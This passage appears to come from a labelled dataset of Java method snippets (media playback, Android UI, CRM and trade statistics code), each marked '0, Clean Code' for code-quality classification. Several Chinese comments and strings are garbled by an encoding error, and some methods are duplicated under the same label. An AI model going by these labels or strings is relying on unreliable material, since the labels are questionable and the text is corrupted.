public AbstractMediaListHeaderPresenter(Context context,int mThemeResId){
  mContext=new ContextThemeWrapper(context.getApplicationContext(),mThemeResId);
  setHeaderPresenter(null);
}
/** 
 * Constructor used for creating an abstract media-list header presenter. The styling for this presenter is extracted from Context of parent in {@link #createRowViewHolder(ViewGroup)}.
 */
public AbstractMediaListHeaderPresenter(){
  mContext=null;
  setHeaderPresenter(null);
}
",0,Clean Code
"public void createStrippedThumb(){
  if (photoThumbs == null || !canCreateStripedThubms() && !hasExtendedMediaPreview() || strippedThumb != null) {
    return;
  }
  try {
    String filter=""b"";
    if (isRoundVideo()) {
      filter+=""r"";
    }
    for (int a=0, N=photoThumbs.size(); a < N; a++) {
      TLRPC.PhotoSize photoSize=photoThumbs.get(a);
      if (photoSize instanceof TLRPC.TL_photoStrippedSize) {
        strippedThumb=new BitmapDrawable(ApplicationLoader.applicationContext.getResources(),ImageLoader.getStrippedPhotoBitmap(photoSize.bytes,filter));
        break;
      }
    }
  }
 catch (  Throwable e) {
    FileLog.e(e);
  }
}",0,Clean Code
"/** 
 * Gets the names and order of the actions to be included in the notification at the current player state. <p>The playback and custom actions are combined and placed in the following order if not omitted: <pre> +------------------------------------------------------------------------+ | prev | &lt;&lt; | play/pause | &gt;&gt; | next | custom actions | stop | +------------------------------------------------------------------------+ </pre> <p>This method can be safely overridden. However, the names must be of the playback actions {@link #ACTION_PAUSE},  {@link #ACTION_PLAY},  {@link #ACTION_FAST_FORWARD},  {@link #ACTION_REWIND},  {@link #ACTION_NEXT} or {@link #ACTION_PREVIOUS}, or a key contained in the map returned by  {@link CustomActionReceiver#createCustomActions(Context,int)}. Otherwise the action name is ignored.
 */
protected List<String> getActions(Player player){
  boolean enablePrevious=false;
  boolean enableRewind=false;
  boolean enableFastForward=false;
  boolean enableNext=false;
  Timeline timeline=player.getCurrentTimeline();
  if (!timeline.isEmpty() && !player.isPlayingAd()) {
    timeline.getWindow(player.getCurrentWindowIndex(),window);
    enablePrevious=window.isSeekable || !window.isDynamic || player.hasPrevious();
    enableRewind=rewindMs > 0;
    enableFastForward=fastForwardMs > 0;
    enableNext=window.isDynamic || player.hasNext();
  }
  List<String> stringActions=new ArrayList<>();
  if (useNavigationActions && enablePrevious) {
    stringActions.add(ACTION_PREVIOUS);
  }
  if (enableRewind) {
    stringActions.add(ACTION_REWIND);
  }
  if (usePlayPauseActions) {
    if (shouldShowPauseButton(player)) {
      stringActions.add(ACTION_PAUSE);
    }
 else {
      stringActions.add(ACTION_PLAY);
    }
  }
  if (enableFastForward) {
    stringActions.add(ACTION_FAST_FORWARD);
  }
  if (useNavigationActions && enableNext) {
    stringActions.add(ACTION_NEXT);
  }
  if (customActionReceiver != null) {
    stringActions.addAll(customActionReceiver.getCustomActions(player));
  }
  if (useStopAction) {
    stringActions.add(ACTION_STOP);
  }
  return stringActions;
}",0,Clean Code
"@Override public void run(){
  Bitmap bitmap=AssetsUtils.getImageFromAssetsFile(getContext(),path + ""/"" + animImgs.get(index));
  setImageBitmap(bitmap);
  if ((index == animImgs.size() - 1 && step > 0) || (index == 0 && step < 0)) {
    step=-step;
  }
  index+=step;
  handler.postDelayed(this,deltaTime);
}",0,Clean Code
"public static void recursiveFiles(String path,ZipNameListener zipNameListener){
  File file=new File(path);
  File[] files=file.listFiles();
  if (files == null) {
    return;
  }
  if (files.length == 0) {
    System.out.println(path + ""璇ユ枃浠跺す涓嬫病鏈夋枃浠�"");
  }
  for (  File f : files) {
    if (f.isDirectory() && (isSymbolicLink(f) != SYMBOLIC_LINK_FILE && isSymbolicLink(f) != SYMBOLIC_LINK_FILE_ERROR)) {
      recursiveFiles(f.getAbsolutePath(),zipNameListener);
    }
 else     if (f.isFile()) {
      Log.e(""XINHAO_HAN"",""recursiveFiles: "" + f.getAbsolutePath());
      size++;
      fileSize+=f.length();
      zipNameListener.zip(""鑾峰彇鏂囦欢["" + size + ""]锛�""+ f.getAbsolutePath(),0,0);
    }
 else {
      zipNameListener.zip(""蹇嵎鏂瑰紡"",0,0);
    }
  }
}",0,Clean Code
"/** 
 * Don't use this method for setting your adapter, otherwise exception will by thrown. Call  {@link #setAdapter(DialogsListAdapter)} instead.
 */
@Override public void setAdapter(Adapter adapter){
  throw new IllegalArgumentException(""You can't set adapter to DialogsList. Use #setAdapter(DialogsListAdapter) instead."");
}
/** 
 * Sets adapter for DialogsList
 * @param adapter  Adapter. Must extend DialogsListAdapter
 * @param < DIALOG > Dialog model class
 */
public <DIALOG extends IDialog<?>>void setAdapter(DialogsListAdapter<DIALOG> adapter){
  setAdapter(adapter,false);
}
/** 
 * Sets adapter for DialogsList
 * @param adapter       Adapter. Must extend DialogsListAdapter
 * @param reverseLayout weather to use reverse layout for layout manager.
 * @param < DIALOG >      Dialog model class
 */
public <DIALOG extends IDialog<?>>void setAdapter(DialogsListAdapter<DIALOG> adapter,boolean reverseLayout){
  SimpleItemAnimator itemAnimator=new DefaultItemAnimator();
  itemAnimator.setSupportsChangeAnimations(false);
  LinearLayoutManager layoutManager=new LinearLayoutManager(getContext(),LinearLayoutManager.VERTICAL,reverseLayout);
  setItemAnimator(itemAnimator);
  setLayoutManager(layoutManager);
  adapter.setStyle(dialogStyle);
  super.setAdapter(adapter);
}
",0,Clean Code
"/** 
 * Adds a new weighted value.
 * @param weight The weight of the new observation.
 * @param value The value of the new observation.
 */
public void addSample(int weight,float value){
  ensureSortedByIndex();
  Sample newSample=recycledSampleCount > 0 ? recycledSamples[--recycledSampleCount] : new Sample();
  newSample.index=nextSampleIndex++;
  newSample.weight=weight;
  newSample.value=value;
  samples.add(newSample);
  totalWeight+=weight;
  while (totalWeight > maxWeight) {
    int excessWeight=totalWeight - maxWeight;
    Sample oldestSample=samples.get(0);
    if (oldestSample.weight <= excessWeight) {
      totalWeight-=oldestSample.weight;
      samples.remove(0);
      if (recycledSampleCount < MAX_RECYCLED_SAMPLES) {
        recycledSamples[recycledSampleCount++]=oldestSample;
      }
    }
 else {
      oldestSample.weight-=excessWeight;
      totalWeight-=excessWeight;
    }
  }
}",0,Clean Code
"int skipData(int track,long positionUs){
  if (suppressRead()) {
    return 0;
  }
  maybeNotifyDownstreamFormat(track);
  SampleQueue sampleQueue=sampleQueues[track];
  int skipCount;
  if (loadingFinished && positionUs > sampleQueue.getLargestQueuedTimestampUs()) {
    skipCount=sampleQueue.advanceToEnd();
  }
 else {
    skipCount=sampleQueue.advanceTo(positionUs,true,true);
    if (skipCount == SampleQueue.ADVANCE_FAILED) {
      skipCount=0;
    }
  }
  if (skipCount == 0) {
    maybeStartDeferredRetry(track);
  }
  return skipCount;
}
@Override public int skipData(long positionUs){
  return ProgressiveMediaPeriod.this.skipData(track,positionUs);
}",0,Clean Code
"public void scheduleRebuild(int x,int y,int z,boolean important){
  RenderAsserts.validateCurrentThread();
  this.sectionCache.invalidate(x,y,z);
  RenderSection section=this.sectionByPosition.get(SectionPos.asLong(x,y,z));
  if (section != null && section.isBuilt()) {
    ChunkUpdateType pendingUpdate;
    if (allowImportantRebuilds() && (important || this.shouldPrioritizeTask(section,NEARBY_REBUILD_DISTANCE))) {
      pendingUpdate=ChunkUpdateType.IMPORTANT_REBUILD;
    }
 else {
      pendingUpdate=ChunkUpdateType.REBUILD;
    }
    pendingUpdate=ChunkUpdateType.getPromotionUpdateType(section.getPendingUpdate(),pendingUpdate);
    if (pendingUpdate != null) {
      section.setPendingUpdate(pendingUpdate);
      this.needsGraphUpdate=true;
    }
  }
}
",0,Clean Code
"@Nullable @Override public View onCreateView(LayoutInflater inflater,final ViewGroup container,Bundle savedInstanceState){
  resolveTheme();
  LayoutInflater localInflater=getThemeInflater(inflater);
  final ViewGroup view=(ViewGroup)localInflater.inflate(R.layout.lb_onboarding_fragment,container,false);
  mIsLtr=getResources().getConfiguration().getLayoutDirection() == View.LAYOUT_DIRECTION_LTR;
  mPageIndicator=(PagingIndicator)view.findViewById(R.id.page_indicator);
  mPageIndicator.setOnClickListener(mOnClickListener);
  mPageIndicator.setOnKeyListener(mOnKeyListener);
  mStartButton=view.findViewById(R.id.button_start);
  mStartButton.setOnClickListener(mOnClickListener);
  mStartButton.setOnKeyListener(mOnKeyListener);
  mMainIconView=(ImageView)view.findViewById(R.id.main_icon);
  mLogoView=(ImageView)view.findViewById(R.id.logo);
  mTitleView=(TextView)view.findViewById(R.id.title);
  mDescriptionView=(TextView)view.findViewById(R.id.description);
  if (mTitleViewTextColorSet) {
    mTitleView.setTextColor(mTitleViewTextColor);
  }
  if (mDescriptionViewTextColorSet) {
    mDescriptionView.setTextColor(mDescriptionViewTextColor);
  }
  if (mDotBackgroundColorSet) {
    mPageIndicator.setDotBackgroundColor(mDotBackgroundColor);
  }
  if (mArrowColorSet) {
    mPageIndicator.setArrowColor(mArrowColor);
  }
  if (mArrowBackgroundColorSet) {
    mPageIndicator.setDotBackgroundColor(mArrowBackgroundColor);
  }
  if (mStartButtonTextSet) {
    ((Button)mStartButton).setText(mStartButtonText);
  }
  final Context context=getContext();
  if (sSlideDistance == 0) {
    sSlideDistance=(int)(SLIDE_DISTANCE * context.getResources().getDisplayMetrics().scaledDensity);
  }
  view.requestFocus();
  return view;
}",0,Clean Code
"/** 
 * Sets the  {@link LoadErrorHandlingPolicy}. The default value is created by calling  {@link DefaultLoadErrorHandlingPolicy#DefaultLoadErrorHandlingPolicy()}. <p>Calling this method overrides any calls to  {@link #setMinLoadableRetryCount(int)}.
 * @param loadErrorHandlingPolicy A {@link LoadErrorHandlingPolicy}.
 * @return This factory, for convenience.
 * @throws IllegalStateException If one of the {@code create} methods has already been called.
 */
public Factory setLoadErrorHandlingPolicy(LoadErrorHandlingPolicy loadErrorHandlingPolicy){
  Assertions.checkState(!isCreateCalled);
  this.loadErrorHandlingPolicy=loadErrorHandlingPolicy;
  return this;
}
/** 
 * Sets the  {@link LoadErrorHandlingPolicy}. The default value is created by calling  {@link DefaultLoadErrorHandlingPolicy#DefaultLoadErrorHandlingPolicy()}.
 * @param loadErrorHandlingPolicy A {@link LoadErrorHandlingPolicy}.
 * @return This factory, for convenience.
 * @throws IllegalStateException If one of the {@code create} methods has already been called.
 */
public Factory setLoadErrorHandlingPolicy(LoadErrorHandlingPolicy loadErrorHandlingPolicy){
  Assertions.checkState(!isCreateCalled);
  this.loadErrorHandlingPolicy=loadErrorHandlingPolicy;
  return this;
}
/** 
 * Sets the  {@link LoadErrorHandlingPolicy}. The default value is created by calling  {@link DefaultLoadErrorHandlingPolicy#DefaultLoadErrorHandlingPolicy()}. <p>Calling this method overrides any calls to  {@link #setMinLoadableRetryCount(int)}.
 * @param loadErrorHandlingPolicy A {@link LoadErrorHandlingPolicy}.
 * @return This factory, for convenience.
 * @throws IllegalStateException If one of the {@code create} methods has already been called.
 */
public Factory setLoadErrorHandlingPolicy(LoadErrorHandlingPolicy loadErrorHandlingPolicy){
  Assertions.checkState(!isCreateCalled);
  this.loadErrorHandlingPolicy=loadErrorHandlingPolicy;
  return this;
}
",0,Clean Code
"private void setKeyIconColor(Key key,Drawable icon,Keyboard keyboard){
  if (key.isAccentColored()) {
    mColors.setColor(icon,ColorType.ACTION_KEY_ICON);
  }
 else   if (key.isShift() && keyboard != null) {
    if (keyboard.mId.mElementId == KeyboardId.ELEMENT_ALPHABET_MANUAL_SHIFTED || keyboard.mId.mElementId == KeyboardId.ELEMENT_ALPHABET_SHIFT_LOCKED || keyboard.mId.mElementId == KeyboardId.ELEMENT_ALPHABET_AUTOMATIC_SHIFTED || keyboard.mId.mElementId == KeyboardId.ELEMENT_ALPHABET_SHIFT_LOCK_SHIFTED)     mColors.setColor(icon,ColorType.SHIFT_KEY_ICON);
 else     mColors.setColor(icon,ColorType.KEY_ICON);
  }
 else   if (key.getBackgroundType() != Key.BACKGROUND_TYPE_NORMAL) {
    mColors.setColor(icon,ColorType.KEY_ICON);
  }
 else   if (this instanceof PopupKeysKeyboardView) {
    mColors.setColor(icon,ColorType.KEY_ICON);
  }
 else   if (key.getCode() == Constants.CODE_SPACE || key.getCode() == KeyCode.ZWNJ) {
    mColors.setColor(icon,ColorType.KEY_ICON);
  }
 else {
    mColors.setColor(icon,ColorType.KEY_TEXT);
  }
}
",0,Clean Code
"public static int ways3(int N,int start,int aim,int K){
  if (N < 2 || start < 1 || start > N || aim < 1 || aim > N || K < 1) {
    return -1;
  }
  int[][] dp=new int[N + 1][K + 1];
  dp[aim][0]=1;
  for (int rest=1; rest <= K; rest++) {
    dp[1][rest]=dp[2][rest - 1];
    for (int cur=2; cur < N; cur++) {
      dp[cur][rest]=dp[cur - 1][rest - 1] + dp[cur + 1][rest - 1];
    }
    dp[N][rest]=dp[N - 1][rest - 1];
  }
  return dp[start][K];
}",0,Clean Code
"private void appendTogglePinChannelButton(){
  if (!mIsPinToSidebarEnabled) {
    return;
  }
  Video original=getVideo();
  if (original == null || (!original.hasVideo() && !original.hasReloadPageKey() && !original.hasChannel())) {
    return;
  }
  getDialogPresenter().appendSingleButton(UiOptionItem.from(getContext().getString(original.isPlaylistAsChannel() || (original.hasNestedItems() && original.belongsToUserPlaylists()) ? R.string.pin_playlist : R.string.pin_channel),optionItem -> {
    if (original.hasVideo()) {
      MessageHelpers.showMessage(getContext(),R.string.wait_data_loading);
      mServiceManager.loadMetadata(original,metadata -> {
        Video video=Video.from(original);
        video.sync(metadata);
        togglePinToSidebar(createPinnedChannel(video));
      }
);
    }
 else {
      togglePinToSidebar(createPinnedChannel(original));
    }
  }
));
}
",0,Clean Code
"@Override public NodeVisitor child(String ns,String name){
  NodeVisitor child=super.child(ns,name);
  return new ManifestTagVisitor(child);
}
@Override public NodeVisitor child(String ns,String name){
  NodeVisitor child=super.child(ns,name);
  if (""application"".equals(name)) {
    return new ApplicationTagVisitor(child);
  }
  return child;
}
@Override public NodeVisitor child(String ns,String name){
  NodeVisitor child=super.child(ns,name);
  if (""meta-data"".equals(name)) {
    return new MetaDataVisitor(child);
  }
  return child;
}
",0,Clean Code
"/** 
 * Creates a timeline containing a single period and a window that spans it.
 * @param durationUs The duration of the period, in microseconds.
 * @param isSeekable Whether seeking is supported within the period.
 * @param isDynamic Whether the window may change when the timeline is updated.
 */
public SinglePeriodTimeline(long durationUs,boolean isSeekable,boolean isDynamic){
  this(durationUs,isSeekable,isDynamic,null);
}
/** 
 * Creates a timeline containing a single period and a window that spans it.
 * @param durationUs The duration of the period, in microseconds.
 * @param isSeekable Whether seeking is supported within the period.
 * @param isDynamic Whether the window may change when the timeline is updated.
 * @param tag A tag used for {@link Timeline.Window#tag}.
 */
public SinglePeriodTimeline(long durationUs,boolean isSeekable,boolean isDynamic,@Nullable Object tag){
  this(durationUs,durationUs,0,0,isSeekable,isDynamic,tag);
}
/** 
 * Creates a timeline with one period, and a window of known duration starting at a specified position in the period.
 * @param periodDurationUs The duration of the period in microseconds.
 * @param windowDurationUs The duration of the window in microseconds.
 * @param windowPositionInPeriodUs The position of the start of the window in the period, inmicroseconds.
 * @param windowDefaultStartPositionUs The default position relative to the start of the window atwhich to begin playback, in microseconds.
 * @param isSeekable Whether seeking is supported within the window.
 * @param isDynamic Whether the window may change when the timeline is updated.
 * @param tag A tag used for {@link Timeline.Window#tag}.
 */
public SinglePeriodTimeline(long periodDurationUs,long windowDurationUs,long windowPositionInPeriodUs,long windowDefaultStartPositionUs,boolean isSeekable,boolean isDynamic,@Nullable Object tag){
  this(C.TIME_UNSET,C.TIME_UNSET,periodDurationUs,windowDurationUs,windowPositionInPeriodUs,windowDefaultStartPositionUs,isSeekable,isDynamic,tag);
}
/** 
 * Creates a timeline with one period, and a window of known duration starting at a specified position in the period.
 * @param presentationStartTimeMs The start time of the presentation in milliseconds since theepoch.
 * @param windowStartTimeMs The window's start time in milliseconds since the epoch.
 * @param periodDurationUs The duration of the period in microseconds.
 * @param windowDurationUs The duration of the window in microseconds.
 * @param windowPositionInPeriodUs The position of the start of the window in the period, inmicroseconds.
 * @param windowDefaultStartPositionUs The default position relative to the start of the window atwhich to begin playback, in microseconds.
 * @param isSeekable Whether seeking is supported within the window.
 * @param isDynamic Whether the window may change when the timeline is updated.
 * @param tag A tag used for {@link Timeline.Window#tag}.
 */
public SinglePeriodTimeline(long presentationStartTimeMs,long windowStartTimeMs,long periodDurationUs,long windowDurationUs,long windowPositionInPeriodUs,long windowDefaultStartPositionUs,boolean isSeekable,boolean isDynamic,@Nullable Object tag){
  this.presentationStartTimeMs=presentationStartTimeMs;
  this.windowStartTimeMs=windowStartTimeMs;
  this.periodDurationUs=periodDurationUs;
  this.windowDurationUs=windowDurationUs;
  this.windowPositionInPeriodUs=windowPositionInPeriodUs;
  this.windowDefaultStartPositionUs=windowDefaultStartPositionUs;
  this.isSeekable=isSeekable;
  this.isDynamic=isDynamic;
  this.tag=tag;
}",0,Clean Code
"private static String doExecute(String reqUrl,Map<String,String> paramMap,String reqMethod,String recvEncoding){
  HttpURLConnection urlCon=null;
  String responseContent=null;
  try {
    StringBuilder params=new StringBuilder();
    if (paramMap != null) {
      for (      Map.Entry<String,String> element : paramMap.entrySet()) {
        params.append(element.getKey());
        params.append(""="");
        params.append(URLEncoder.encode(element.getValue(),REQUEST_ENCODING));
        params.append(""&"");
      }
      if (params.length() > 0) {
        params=params.deleteCharAt(params.length() - 1);
      }
      if (params.length() > 0 && (REQUEST_METHOD_GET.equals(reqMethod) || REQUEST_METHOD_DELETE.equals(reqMethod))) {
        reqUrl=reqUrl + ""?"" + params.toString();
      }
    }
    URL url=new URL(reqUrl);
    urlCon=(HttpURLConnection)url.openConnection();
    urlCon.setRequestMethod(reqMethod);
    urlCon.setConnectTimeout(CONNECT_TIME_OUT);
    urlCon.setReadTimeout(READ_TIME_OUT);
    urlCon.setDoOutput(true);
    if (REQUEST_METHOD_POST.equals(reqMethod) || REQUEST_METHOD_PUT.equals(reqMethod)) {
      byte[] b=params.toString().getBytes();
      urlCon.setRequestProperty(""Content-Type"",""application/x-www-form-urlencoded;charset=utf-8"");
      urlCon.setRequestProperty(""Content-Length"",String.valueOf(b.length));
      urlCon.getOutputStream().write(b,0,b.length);
      urlCon.getOutputStream().flush();
      urlCon.getOutputStream().close();
    }
    InputStream in=urlCon.getInputStream();
    BufferedReader rd=new BufferedReader(new InputStreamReader(in,recvEncoding));
    String tempLine=rd.readLine();
    StringBuffer tempStr=new StringBuffer();
    while (tempLine != null) {
      tempStr.append(tempLine);
      tempLine=rd.readLine();
    }
    responseContent=tempStr.toString();
    rd.close();
    in.close();
    urlCon.getResponseMessage();
  }
 catch (  IOException e) {
    e.printStackTrace();
  }
 finally {
    if (urlCon != null) {
      urlCon.disconnect();
    }
  }
  return responseContent;
}",0,Clean Code
"private static void openFile(){
  try {
    if (writeLog && fos == null && sErrorCount.get() < 5) {
      File file=new File(""/data/local/tmp/am.txt"");
      fos=new FileOutputStream(file);
      fos.write(""\n\n\n--------------------"".getBytes());
      fos.write(new Date().toString().getBytes());
      fos.write(""\n\n"".getBytes());
      chown(file.getAbsolutePath(),2000,2000);
      chmod(file.getAbsolutePath(),0755);
    }
  }
 catch (  Exception e) {
    e.printStackTrace();
    sErrorCount.incrementAndGet();
    fos=null;
  }
}",0,Clean Code
"/** 
 * check the token is gengrate by this client
 * @param token
 * @return
 */
public boolean verifyToken(String token){
  JSONObject userInfo=decodeAccessToken(token);
  if (clientId != null && userInfo != null && clientId.equals(userInfo.getString(""appid""))) {
    return true;
  }
  return false;
}
",0,Clean Code
"@Override public void dispatch(RepeatMeta meta,RecordModel recordModel) throws RepeatException {
  if (recordModel == null || recordModel.getEntranceInvocation() == null || recordModel.getEntranceInvocation().getType() == null) {
    throw new RepeatException(""invalid request, record or root invocation is null"");
  }
  Repeater repeater=RepeaterBridge.instance().select(recordModel.getEntranceInvocation().getType());
  if (repeater == null) {
    throw new RepeatException(""no valid repeat found for invoke type:"" + recordModel.getEntranceInvocation().getType());
  }
  RepeatContext context=new RepeatContext(meta,recordModel,TraceGenerator.generate());
  MoonboxRepeatCache.putRepeatContext(context);
  repeater.repeat(context);
}
",0,Clean Code
"@Override protected List<Optional<Object>> getRequiredFieldValues(StatisticsJsonStringObject stats){
  List<Optional<Object>> requiredFields=List.of(Optional.ofNullable(stats.getPersonsWithThirdDoseRatio()),Optional.ofNullable(stats.getPersonsWithThirdDoseCumulated()));
  if (requiredFields.contains(Optional.empty()) || stats.getPersonsWithThirdDoseRatio() <= 0 || stats.getPersonsWithThirdDoseCumulated() <= 0) {
    return List.of(Optional.empty());
  }
  return requiredFields;
}",0,Clean Code
"public void clear(ActionEvent event){
  boolean firstTab=true;
  for (Iterator<Tab> iterator=paymentTabs.getTabs().iterator(); iterator.hasNext(); ) {
    PaymentController controller=(PaymentController)iterator.next().getUserData();
    if (firstTab) {
      controller.clear();
      firstTab=false;
    }
 else {
      EventManager.get().unregister(controller);
      iterator.remove();
    }
  }
  fee.textProperty().removeListener(feeListener);
  fee.setText("""");
  fee.textProperty().addListener(feeListener);
  cpfpFeeRate.setVisible(false);
  fiatFeeAmount.setText("""");
  userFeeSet.set(false);
  setDefaultFeeRate();
  utxoSelectorProperty.setValue(null);
  txoFilterProperty.setValue(null);
  replacedTransactionProperty.setValue(null);
  opReturnsList.clear();
  excludedChangeNodes.clear();
  walletTransactionProperty.setValue(null);
  walletForm.setCreatedWalletTransaction(null);
  insufficientInputsProperty.set(false);
  validationSupport.setErrorDecorationEnabled(false);
  setInputFieldsDisabled(false,false);
  efficiencyToggle.setDisable(false);
  privacyToggle.setDisable(false);
  notificationButton.setVisible(false);
  createButton.setDefaultButton(true);
  paymentCodeProperty.set(null);
  addressNodeMap.clear();
}
",0,Clean Code
"/** 
 * Returns a  {@link Attributes} instance with a single key-value pair. 
 */
static <T>Attributes of(AttributeKey<T> key,T value){
  if (key == null || key.getKey().isEmpty() || value == null) {
    return empty();
  }
  return new ArrayBackedAttributes(new Object[]{key,value});
}
/** 
 * Returns a  {@link Attributes} instance with two key-value pairs. Order of the keys is notpreserved. Duplicate keys will be removed.
 */
static <T,U>Attributes of(AttributeKey<T> key1,T value1,AttributeKey<U> key2,U value2){
  if (key1 == null || key1.getKey().isEmpty() || value1 == null) {
    return of(key2,value2);
  }
  if (key2 == null || key2.getKey().isEmpty() || value2 == null) {
    return of(key1,value1);
  }
  if (key1.getKey().equals(key2.getKey())) {
    return of(key2,value2);
  }
  if (key1.getKey().compareTo(key2.getKey()) > 0) {
    return new ArrayBackedAttributes(new Object[]{key2,value2,key1,value1});
  }
  return new ArrayBackedAttributes(new Object[]{key1,value1,key2,value2});
}
/** 
 * Returns a  {@link Attributes} instance with three key-value pairs. Order of the keys is notpreserved. Duplicate keys will be removed.
 */
static <T,U,V>Attributes of(AttributeKey<T> key1,T value1,AttributeKey<U> key2,U value2,AttributeKey<V> key3,V value3){
  return sortAndFilterToAttributes(key1,value1,key2,value2,key3,value3);
}
/** 
 * Returns a  {@link Attributes} instance with four key-value pairs. Order of the keys is notpreserved. Duplicate keys will be removed.
 */
static <T,U,V,W>Attributes of(AttributeKey<T> key1,T value1,AttributeKey<U> key2,U value2,AttributeKey<V> key3,V value3,AttributeKey<W> key4,W value4){
  return sortAndFilterToAttributes(key1,value1,key2,value2,key3,value3,key4,value4);
}
/** 
 * Returns a  {@link Attributes} instance with five key-value pairs. Order of the keys is notpreserved. Duplicate keys will be removed.
 */
@SuppressWarnings(""TooManyParameters"") static <T,U,V,W,X>Attributes of(AttributeKey<T> key1,T value1,AttributeKey<U> key2,U value2,AttributeKey<V> key3,V value3,AttributeKey<W> key4,W value4,AttributeKey<X> key5,X value5){
  return sortAndFilterToAttributes(key1,value1,key2,value2,key3,value3,key4,value4,key5,value5);
}
/** 
 * Returns a  {@link Attributes} instance with the given key-value pairs. Order of the keys is notpreserved. Duplicate keys will be removed.
 */
@SuppressWarnings(""TooManyParameters"") static <T,U,V,W,X,Y>Attributes of(AttributeKey<T> key1,T value1,AttributeKey<U> key2,U value2,AttributeKey<V> key3,V value3,AttributeKey<W> key4,W value4,AttributeKey<X> key5,X value5,AttributeKey<Y> key6,Y value6){
  return sortAndFilterToAttributes(key1,value1,key2,value2,key3,value3,key4,value4,key5,value5,key6,value6);
}",0,Clean Code
"@Test public void testCustomInitialSectionReader() throws Exception {
  CustomTsPayloadReaderFactory factory=new CustomTsPayloadReaderFactory(false,true);
  TsExtractor tsExtractor=new TsExtractor(TsExtractor.MODE_MULTI_PMT,new TimestampAdjuster(0),factory);
  FakeExtractorInput input=new FakeExtractorInput.Builder().setData(TestUtil.getByteArray(ApplicationProvider.getApplicationContext(),""ts/sample_with_sdt.ts"")).setSimulateIOErrors(false).setSimulateUnknownLength(false).setSimulatePartialReads(false).build();
  tsExtractor.init(new FakeExtractorOutput());
  PositionHolder seekPositionHolder=new PositionHolder();
  int readResult=Extractor.RESULT_CONTINUE;
  while (readResult != Extractor.RESULT_END_OF_INPUT) {
    readResult=tsExtractor.read(input,seekPositionHolder);
    if (readResult == Extractor.RESULT_SEEK) {
      input.setPosition((int)seekPositionHolder.position);
    }
  }
  assertThat(factory.sdtReader.consumedSdts).isEqualTo(2);
}",0,Clean Code
"/** 
 * 淇敼瀛楁閰嶇疆
 * @param fieldSort data
 */
@Override public void setFieldConfig(CrmFieldSortBO fieldSort){
  Long userId=UserUtil.getUserId();
  crmFieldSortService.lambdaUpdate().eq(CrmFieldSort::getLabel,fieldSort.getLabel()).eq(CrmFieldSort::getUserId,userId).remove();
  List<CrmFieldSort> fieldSortList=crmFieldSortService.queryAllFieldSortList(fieldSort.getLabel(),userId);
  List<CrmFieldSort> noHideFields=fieldSort.getNoHideFields();
  List<CrmFieldSort> hideFields=fieldSort.getHideFields();
  for (  CrmFieldSort sort : fieldSortList) {
    if (hideFields.contains(sort)) {
      sort.setIsHide(1);
      continue;
    }
    int index=noHideFields.indexOf(sort);
    if (index >= 0) {
      sort.setIsHide(0);
      sort.setSort(index + 1);
      CrmFieldSort crmFieldSort=noHideFields.get(index);
      sort.setStyle(crmFieldSort.getStyle());
    }
  }
  crmFieldSortService.saveBatch(fieldSortList,Const.BATCH_SAVE_SIZE);
}",0,Clean Code
"/** 
 * Creates a new message.
 * @param sender The {@link Sender} used to send the message.
 * @param target The {@link Target} the message is sent to.
 * @param timeline The timeline used when setting the position with {@link #setPosition(long)}. If set to  {@link Timeline#EMPTY}, any position can be specified.
 * @param defaultWindowIndex The default window index in the {@code timeline} when no other windowindex is specified.
 * @param defaultHandler The default handler to send the message on when no other handler isspecified.
 */
public PlayerMessage(Sender sender,Target target,Timeline timeline,int defaultWindowIndex,Handler defaultHandler){
  this.sender=sender;
  this.target=target;
  this.timeline=timeline;
  this.handler=defaultHandler;
  this.windowIndex=defaultWindowIndex;
  this.positionMs=C.TIME_UNSET;
  this.deleteAfterDelivery=true;
}
",0,Clean Code
"private static void parseGaSpecificConfig(ParsableBitArray bitArray,int audioObjectType,int channelConfiguration){
  bitArray.skipBits(1);
  boolean dependsOnCoreDecoder=bitArray.readBit();
  if (dependsOnCoreDecoder) {
    bitArray.skipBits(14);
  }
  boolean extensionFlag=bitArray.readBit();
  if (channelConfiguration == 0) {
    throw new UnsupportedOperationException();
  }
  if (audioObjectType == 6 || audioObjectType == 20) {
    bitArray.skipBits(3);
  }
  if (extensionFlag) {
    if (audioObjectType == 22) {
      bitArray.skipBits(16);
    }
    if (audioObjectType == 17 || audioObjectType == 19 || audioObjectType == 20 || audioObjectType == 23) {
      bitArray.skipBits(3);
    }
    bitArray.skipBits(1);
  }
}",0,Clean Code
"@Override public String statisticsTrade(Integer days){
  LocalDateTime today=LocalDateTime.now();
  return IntStream.rangeClosed(1,days).mapToObj(day -> statisticsTrade(today.minusDays(day))).sorted().collect(Collectors.joining(""\n""));
}
/** 
 * 缁熻浜ゆ槗鏁版嵁
 * @param date 闇�瑕佺粺璁＄殑鏃ユ湡
 * @return 缁熻缁撴灉
 */
private String statisticsTrade(LocalDateTime date){
  LocalDateTime beginTime=LocalDateTimeUtil.beginOfDay(date);
  LocalDateTime endTime=LocalDateTimeUtil.endOfDay(date);
  String dateStr=DatePattern.NORM_DATE_FORMATTER.format(date);
  TradeStatisticsDO entity=tradeStatisticsMapper.selectByTimeBetween(beginTime,endTime);
  if (entity != null) {
    return dateStr + "" 鏁版嵁宸插瓨鍦紝濡傛灉闇�瑕侀噸鏂扮粺璁★紝璇峰厛鍒犻櫎瀵瑰簲鐨勬暟鎹�"";
  }
  StopWatch stopWatch=new StopWatch(dateStr);
  stopWatch.start(""缁熻璁㈠崟"");
  TradeOrderSummaryRespBO orderSummary=tradeOrderStatisticsService.getOrderSummary(beginTime,endTime);
  stopWatch.stop();
  stopWatch.start(""缁熻鍞悗"");
  AfterSaleSummaryRespBO afterSaleSummary=afterSaleStatisticsService.getAfterSaleSummary(beginTime,endTime);
  stopWatch.stop();
  stopWatch.start(""缁熻浣ｉ噾"");
  Integer brokerageSettlementPrice=brokerageStatisticsService.getBrokerageSettlementPriceSummary(beginTime,endTime);
  stopWatch.stop();
  stopWatch.start(""缁熻鍏呭��"");
  WalletSummaryRespBO walletSummary=payWalletStatisticsService.getWalletSummary(beginTime,endTime);
  stopWatch.stop();
  entity=TradeStatisticsConvert.INSTANCE.convert(date,orderSummary,afterSaleSummary,brokerageSettlementPrice,walletSummary);
  tradeStatisticsMapper.insert(entity);
  return stopWatch.prettyPrint();
}",0,Clean Code
"@Override public boolean onTouchEvent(final MotionEvent me){
  final int action=me.getActionMasked();
  final long eventTime=me.getEventTime();
  final int index=me.getActionIndex();
  final int x=(int)me.getX(index);
  final int y=(int)me.getY(index);
  final int pointerId=me.getPointerId(index);
switch (action) {
case MotionEvent.ACTION_DOWN:
case MotionEvent.ACTION_POINTER_DOWN:
    onDownEvent(x,y,pointerId,eventTime);
